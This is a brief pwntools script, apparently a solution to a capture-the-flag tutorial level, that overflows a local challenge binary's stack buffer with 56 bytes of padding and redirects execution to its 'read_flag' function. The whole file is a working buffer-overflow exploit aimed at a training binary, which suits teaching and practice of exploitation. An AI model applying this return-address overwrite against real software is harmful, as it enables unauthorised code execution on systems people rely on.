from pwn import *

exe = ELF('/challenge/pwntools-tutorials-level4.0', checksec=False)
p = process(exe.path)

context(arch="amd64", os="linux", log_level="info")

offset = 48 + 8
payload = b'A' * offset + p64(exe.symbols['read_flag'])

p.sendline(payload)

p.interactive()